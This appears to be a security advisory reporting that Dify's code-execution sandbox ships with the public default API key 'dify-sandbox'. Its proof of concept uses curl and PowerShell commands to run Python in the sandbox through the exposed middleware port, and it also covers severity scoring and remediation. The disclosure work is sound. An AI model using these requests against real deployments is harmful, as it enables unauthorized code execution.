# Dify code-execution sandbox uses shipped default API key "dify-sandbox" (CWE-798, CVSS 7.5)

## Summary

In Dify v1.15.0, the code-execution sandbox container (`langgenius/dify-sandbox:0.2.15`) authenticates incoming API requests with an API key whose default value is the well-known, public string `dify-sandbox`. The value is shipped as a default in four locations — including actively and uncommented in the `.env.example` template — so the normal `cp .env.example .env` quickstart flow keeps the weak key effective with zero operator action. The value is public in the source repository and identical to the project name (trivially guessable). Authentication itself is enforced — an incorrect key returns HTTP 401 — so the defect is the public, shipped default credential (CWE-798), not a missing authentication check. In the official `docker-compose.middleware.yaml` deployment, the sandbox is externally reachable on host port 8194 through a Squid reverse proxy, allowing an external attacker to execute arbitrary Python/JS code inside the sandbox using the known default key.

This is a shipped default credential, the same defect class as Dify's previously assigned CVE-2025-56157.

## Details

**Affected component:** the code-execution sandbox (`langgenius/dify-sandbox:0.2.15`), a separate Docker container in repository `langgenius/dify` that executes Python/JS code submitted through the Code Node. The sandbox authenticates every incoming request by validating the `X-Api-Key` header.

**The shipped default credential appears in four locations:**

1. `api/configs/feature/__init__.py:115` — Python configuration default:

   ```python
   CODE_EXECUTION_API_KEY: str = Field(default="dify-sandbox", ...)
   ```

2. `docker/docker-compose.yaml:509` — the value used when the environment variable is unset:

   ```yaml
   API_KEY: ${SANDBOX_API_KEY:-dify-sandbox}
   ```

3. `docker/.env.example:186` and `:194` — **active and uncommented**:

   ```
   CODE_EXECUTION_API_KEY=dify-sandbox
   SANDBOX_API_KEY=dify-sandbox
   ```

   The normal `cp .env.example .env` quickstart flow therefore keeps this key effective with zero operator action — the software actively ships the weak key rather than the operator misconfiguring it. This is the defining characteristic of CWE-798 (Use of Hard-coded Credentials).

4. `docker/volumes/sandbox/conf/config.yaml:4` — hard-coded in the sandbox container's own configuration (bind-mounted into the container):

   ```yaml
   key: dify-sandbox
   ```

The value `dify-sandbox` is public in the repository, identical to the project name, and trivially guessable — the canonical shipped-default-credential pattern.

**Authentication exists and is enforced.** Sending a request with an incorrect key returns `HTTP/1.1 401 Unauthorized`. The defect is that the credential value is a public, shipped default (CWE-798), not that authentication is missing (CWE-306).

**Reachability:**

- **Default deployment** (`docker-compose.yaml`): the sandbox service has no `ports:` block, so its port is not exposed to the host. Only the Dify API container on the Docker internal network can reach it; external attackers cannot.
- **Middleware deployment** (`docker-compose.middleware.yaml`, an official file in the repository's `docker/` directory): the `ssrf_proxy` service (Squid) maps host port 8194 to the sandbox. The Squid entrypoint script (`ssrf_proxy/docker-entrypoint.sh:63-74`) dynamically generates a reverse-proxy rule:

  ```
  http_port 8194 accel vhost
  cache_peer sandbox parent 8194 0 no-query originserver name=dify_sandbox
  acl dify_sandbox_proxy_port localport 8194
  http_access allow dify_sandbox_proxy_port
  ```

  This `allow` rule fires before the `deny all` rule, so external POST requests to `host:8194/v1/sandbox/run` are forwarded to the sandbox container.

**Same-product precedent.** Dify already has an assigned CWE-798 CVE for the same defect class: CVE-2025-56157 covers default PostgreSQL credentials in `docker-compose.yaml`. The NVD description explicitly records the maintainer's defense — "the Docker configuration does not make PostgreSQL exposed by default" — yet the CVE was assigned regardless. The present report is the same product, the same CWE-798, and the same "not exposed by default" defense, with a stronger reachability posture: the middleware deployment genuinely exposes host port 8194, whereas CVE-2025-56157's PostgreSQL port is genuinely not exposed. Shipped default credentials are a software defect independent of network exposure.

## Proof of Concept

Dynamically verified against Dify v1.15.0 (sandbox image `langgenius/dify-sandbox:0.2.15`) in July 2026 — 6/6 checks passing. The verification host was Windows with Docker Desktop; the payload file names (`poc_simple.json`, `poc_math.json`, `poc_lat.json`) are arbitrary neutral names for temporary local payload files. Note the `language` field must be `"python3"` (not `"python"`); `"python"` returns `{"code":-400,"message":"unsupported language"}`.

**Step 1 — static confirmation of the four hard-coded locations.** From the `docker/` directory of the Dify v1.15.0 source checkout:

```powershell
Select-String -Path .env.example -Pattern "dify-sandbox"
Select-String -Path docker-compose.yaml -Pattern "dify-sandbox"
Select-String -Path "volumes\sandbox\conf\config.yaml" -Pattern "dify-sandbox"
# and from the repository root:
Select-String -Path "api\configs\feature\__init__.py" -Pattern "dify-sandbox"
```

Expected output (all four locations match):

```
.env.example:186:CODE_EXECUTION_API_KEY=dify-sandbox
.env.example:194:SANDBOX_API_KEY=dify-sandbox
docker-compose.yaml:497:image: langgenius/dify-sandbox:0.2.15
docker-compose.yaml:509:API_KEY: ${SANDBOX_API_KEY:-dify-sandbox}
volumes\sandbox\conf\config.yaml:4:key: dify-sandbox
api\configs\feature\__init__.py:115:default="dify-sandbox",
```

**Step 2 — switch to the middleware deployment, exposing port 8194:**

```powershell
docker compose down
Copy-Item envs\middleware.env.example middleware.env   # the example lives in the envs/ subdirectory
Select-String -Path middleware.env -Pattern "SANDBOX_API_KEY"   # confirms the shipped default: SANDBOX_API_KEY=dify-sandbox
docker compose -f docker-compose.middleware.yaml up -d
Start-Sleep -Seconds 40
docker compose -f docker-compose.middleware.yaml ps ssrf_proxy   # expect 0.0.0.0:8194->8194/tcp
```

**Step 3 — core PoC: execute arbitrary Python with the shipped default key (no operator-chosen secret).** Write a UTF-8 no-BOM payload and POST it (PowerShell 5.1's `Set-Content -Encoding utf8` adds a BOM, which the sandbox JSON parser rejects):

```powershell
$payload = '{"language":"python3","code":"print(\"[PoC] SANDBOX_CODE_EXEC_SUCCESS\")","enable_network":false}'
[System.IO.File]::WriteAllText("$PWD\poc_simple.json", $payload, [System.Text.UTF8Encoding]::new($false))

curl.exe -s -X POST "http://localhost:8194/v1/sandbox/run" -H "Content-Type: application/json" -H "X-Api-Key: dify-sandbox" --data-binary "@poc_simple.json"
```

Observed response:

```json
{"code":0,"message":"success","data":{"error":"","stdout":"[PoC] SANDBOX_CODE_EXEC_SUCCESS\n"}}
```

**Step 4 — prove real execution (computation, not a hard-coded response):**

```powershell
$payload = '{"language":"python3","code":"import math;print(\"[PoC]\", 2**10, math.pi)","enable_network":false}'
[System.IO.File]::WriteAllText("$PWD\poc_math.json", $payload, [System.Text.UTF8Encoding]::new($false))
curl.exe -s -X POST "http://localhost:8194/v1/sandbox/run" -H "Content-Type: application/json" -H "X-Api-Key: dify-sandbox" --data-binary "@poc_math.json"
```

Observed response:

```json
{"code":0,"message":"success","data":{"error":"","stdout":"[PoC] 1024 3.141592653589793\n"}}
```

**Step 5 — control: an incorrect key is rejected (401), confirming the key is actually validated; the defect is the public default value, not a missing auth check:**

```powershell
curl.exe -s -v -X POST "http://localhost:8194/v1/sandbox/run" -H "Content-Type: application/json" -H "X-Api-Key: wrong-key-xxxx" --data-binary "@poc_simple.json"
```

Observed response: `HTTP/1.1 401 Unauthorized` (empty body).

**Step 6 — lateral-movement control (honest scope assessment, supports S:U):** attempting to reach the `redis`/`postgres` containers from inside the sandbox fails at name resolution, confirming cross-container lateral movement is not possible:

```powershell
$payload = '{"language":"python3","code":"import socket;s=socket.socket();s.settimeout(3);s.connect((\"redis\",6379));print(\"redis reachable\")","enable_network":true}'
[System.IO.File]::WriteAllText("$PWD\poc_lat.json", $payload, [System.Text.UTF8Encoding]::new($false))
curl.exe -s -X POST "http://localhost:8194/v1/sandbox/run" -H "Content-Type: application/json" -H "X-Api-Key: dify-sandbox" --data-binary "@poc_lat.json"
```

Observed response:

```json
{"code":0,"message":"success","data":{"error":"...socket.gaierror: [Errno -3] Temporary failure in name resolution..."}}
```

Verification summary (6/6):

| # | Check | Result |
|:--:|-------|--------|
| 1 | Four hard-coded locations statically confirmed | Pass |
| 2 | Middleware deployment exposes port 8194 | Pass (`0.0.0.0:8194->8194/tcp`) |
| 3 | Default key `dify-sandbox` executes Python | Pass (`[PoC] SANDBOX_CODE_EXEC_SUCCESS`) |
| 4 | Real execution proven by computation | Pass (`[PoC] 1024 3.141592653589793`) |
| 5 | Wrong key rejected | Pass (`HTTP 401`) |
| 6 | Lateral movement to DB containers | Fails as expected (name resolution error → S:U) |

## Impact

- **Type:** Use of hard-coded credentials (CWE-798), inbound variant — the sandbox's own authentication gate accepts a public, shipped default key.
- **Who is impacted:** an external attacker who can reach host port 8194 (middleware deployment) can execute arbitrary Python/JS code inside the sandbox container using the publicly known default key. The sandbox has `enable_network: true` by default, permitting outbound network requests from within the sandbox. While the sandbox is network-isolated from the database containers (no cross-container lateral movement, verified), arbitrary code execution in a sandbox that runs user-submitted workflow code is itself a direct security-boundary violation. Any operator who used the default quickstart (`cp .env.example .env`) and the middleware deployment is affected with no additional misconfiguration.
- **Attacker capabilities:** arbitrary Python/JS execution inside the sandbox container, including outbound network access from the sandbox. No secret knowledge is required — the key is public in the source repository.
- **Preconditions (disclosed transparently):**
  1. The deployment must expose the sandbox externally. The middleware deployment (`docker-compose.middleware.yaml`, an official file) does so; the default deployment does not.
  2. The operator must not have changed the key. The `.env.example` template ships `dify-sandbox` actively and uncommented, so the default quickstart flow leaves it unchanged.
  3. No secret knowledge is required — `dify-sandbox` is public in the source repository.

## Affected products

| Field | Value |
|------|------|
| **Product** | Dify (repository `langgenius/dify`) |
| **Component** | `langgenius/dify-sandbox:0.2.15` (code-execution sandbox image) |
| **Affected versions** | v1.15.0 (confirmed); the default key `dify-sandbox` has been present since early versions of the dify-sandbox image — the full version range has not been bisected |
| **Patched versions** | None |

## Severity

| Field | Value |
|------|------|
| **Severity** | `High` |
| **Vector string** | `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `7.5` |

- AV:A — the sandbox is externally reachable only in the middleware deployment; the default deployment does not expose the port.
- AC:H — captures the non-default-deployment precondition.
- PR:N — the attacker needs no credentials; the key is public.
- UI:N — no victim interaction is required.
- S:U — the sandbox sits on an isolated internal Docker network; cross-container lateral movement to the database services is not possible (verified).
- C:H / I:H / A:H — arbitrary code execution inside the sandbox container.

## Remediation

1. Remove the `dify-sandbox` default from `.env.example` (leave the lines commented or empty, requiring the operator to set a value).
2. Fail closed at sandbox startup if `API_KEY` is unset or equals the known default value `dify-sandbox`.
3. In `.env.example`, add an explicit warning and a key-generation command (`openssl rand -base64 42`).
4. Do not expose port 8194 by default in the middleware deployment; require an explicit opt-in environment variable.

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-798 | Use of Hard-coded Credentials | The sandbox authenticates incoming `X-Api-Key` headers against the shipped default value `dify-sandbox`, which appears in four source locations including actively and uncommented in `docker/.env.example:186,194` (`CODE_EXECUTION_API_KEY` / `SANDBOX_API_KEY`), so the standard quickstart keeps the public weak key effective with zero operator action. Authentication is enforced (a wrong key returns 401); the defect is the credential value, not a missing check |
